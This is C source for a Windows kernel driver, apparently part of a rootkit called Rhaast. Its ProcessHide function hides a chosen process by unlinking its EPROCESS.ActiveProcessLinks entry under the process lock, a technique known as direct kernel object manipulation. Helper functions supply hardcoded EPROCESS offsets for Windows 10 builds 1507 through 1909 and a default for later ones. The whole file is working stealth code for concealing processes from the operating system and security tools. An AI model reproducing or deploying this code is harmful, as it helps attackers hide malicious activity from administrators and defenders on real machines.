#include <Rhaast.h>

/*!
 * Hides specified process id 
 */
NTSTATUS ProcessHide(
	ULONG Pid
) {
	PEPROCESS     EProcess	     = NULL;
	NTSTATUS      NtStatus	     = STATUS_UNSUCCESSFUL;
	PLIST_ENTRY   ProcessActList = NULL;
	PVOID         ProcessLock    = NULL;
	ULONG         ProcessListOfs = 0;
	ULONG	      ProcessLockOfs = 0;

	/* resolve offsets */
	if ( ( ! ( ProcessLockOfs = ProcessLockOffset() ) ) || 
		 ( ! ( ProcessListOfs = ProcessActiveListOffset() ) ) ) 
	{
		PUTS( "Failed to get offsets ");
		goto CLEANUP;
	}

	/* get Process EPROCESS object by Pid */
	if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Pid ), &EProcess) ) ) {
		PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
		goto CLEANUP;
	}

	/* get pointer of EPROCESS.ActiveProcessLinks linked list */
	if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + ProcessListOfs ) ) ) { 
		NtStatus = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}

	/* get pointer of EPROCESS.ProcessLock lock */
	if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + ProcessLockOfs ) ) ) {
		NtStatus = STATUS_UNSUCCESSFUL;
		goto CLEANUP; 
	}

	PRINTF(
		"Process Hide: [Pid: %d] [EPROCESS: 0x%p]	    \n"
		" - EPROCESS.ActiveProcessLinks :: 0x%x : 0x%p  \n"
		" - EPROCESS.ProcessLock        :: 0x%x : 0x%p  \n",
		Pid, EProcess,
		ProcessListOfs, ProcessActList,
		ProcessLockOfs, ProcessLock
	)

	/* acquire ActiveProcessLinks lock */
	ExAcquirePushLockExclusive( ProcessLock );

	/* backup & add EPROCESS.ActiveProcessLinks entry to 
	 * our internal linked list to un-hide it later */
	if ( ! NT_SUCCESS( NtStatus = PsListHiddenAdd( Pid, ProcessActList ) ) ) {
		PUTS( "Failed to add process to PsHidden list" )
		goto CLEANUP;
	}

	/* remove process from double linked list */
	DoubleLinkedRemove( ProcessActList );

CLEANUP:
	if ( ProcessLock ) {
		/* release lock */
		ExReleasePushLockExclusive( ProcessLock ); 
	}

	if ( EProcess ) {
		ObfDereferenceObject( EProcess );
	}

	return NtStatus;
}

/**
 * @brief
 *	get process lock offset based on current windows version
 */
ULONG ProcessLockOffset(
	VOID
) {
	ULONG Offset = 0;

	switch ( Instance.WindowsBuild )
	{
		case WINBUILD_1507:
		case WINBUILD_1511:
		case WINBUILD_1607:
		case WINBUILD_1703:
		case WINBUILD_1709:
		case WINBUILD_1803:
		case WINBUILD_1809: {
			Offset = 0x2d8;
			break;
		}

		case WINBUILD_1903:
		case WINBUILD_1909: {
			Offset = 0x2e0;
			break;
		}

		default: {
			Offset = 0x438;
			break;
		}
	}

	/* return offset lock */
	return Offset;
}

/*
 * get process lock offset based on current windows version
 */
ULONG ProcessActiveListOffset(
	VOID
) {
	ULONG Offset = 0;

	switch ( Instance.WindowsBuild )
	{	
		case WINBUILD_1507: 
		case WINBUILD_1511:
		case WINBUILD_1607:
		case WINBUILD_1903:
		case WINBUILD_1909: {
			Offset = 0x2f0;
			break;
		}

		case WINBUILD_1703:
		case WINBUILD_1709:
		case WINBUILD_1803:
		case WINBUILD_1809: {
			Offset = 0x2e8;
			break;
		}
		
		default: {
			Offset = 0x448;
			break;
		}	
	}

	/* return offset lock */
	return Offset;
}